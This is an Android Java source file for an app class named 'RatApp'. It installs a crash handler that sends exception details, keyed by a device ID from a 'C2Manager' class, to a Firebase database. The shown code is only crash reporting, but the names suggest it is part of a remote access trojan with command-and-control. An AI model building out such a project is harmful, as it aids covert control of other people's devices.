package com.ratio.ratapp;

import android.app.Application;
import android.content.Context;
import android.util.Log;

import com.google.firebase.FirebaseApp;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

import java.util.HashMap;
import java.util.Map;

public class RatApp extends Application {

    @Override
    public void onCreate() {
        super.onCreate();
        FirebaseApp.initializeApp(this);

        final Context ctx = this;
        Thread.setDefaultUncaughtExceptionHandler((thread, err) -> {
            try {
                FirebaseDatabase fdb = FirebaseDatabase.getInstance();
                DatabaseReference crashRef = fdb.getReference("crashes")
                    .child(C2Manager.getDeviceId(ctx))
                    .child(String.valueOf(System.currentTimeMillis()));

                Map<String, Object> crash = new HashMap<>();
                crash.put("thread", thread.getName());
                crash.put("type", err.getClass().getName());
                crash.put("message", err.getMessage());
                crash.put("stack", Log.getStackTraceString(err));
                crash.put("ts", System.currentTimeMillis());
                crashRef.setValue(crash);

                // give firebase 500ms to flush before dying
                Thread.sleep(500);
            } catch (Throwable ignored) {}
            System.exit(10);
        });
    }
}
